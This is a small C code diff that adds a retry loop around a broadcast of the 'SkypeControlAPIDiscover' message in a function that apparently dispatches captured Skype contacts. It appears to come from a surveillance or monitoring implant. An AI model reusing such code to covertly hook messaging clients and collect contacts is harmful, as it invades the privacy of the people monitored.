@@ -184,7 +184,10 @@ DWORD __stdcall PM_ContactsDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILET
 	} else if (dwFlags & FLAGS_SKAPI_ATT) {
 		// Deve mandare il messaggio per il discovery
 		UINT msg_type = RegisterWindowMessage("SkypeControlAPIDiscover");
-		HM_SafeSendMessageTimeoutW(HWND_BROADCAST, msg_type, (WPARAM)g_report_hwnd, (LPARAM)NULL, SMTO_NORMAL, 500, NULL);
+		for (int i=0; i<30; i++) {
+			if (HM_SafeSendMessageTimeoutW(HWND_BROADCAST, msg_type, (WPARAM)g_report_hwnd, (LPARAM)NULL, SMTO_NORMAL, 500, NULL))
+				break;
+		}
 		return TRUE;
 	}
 
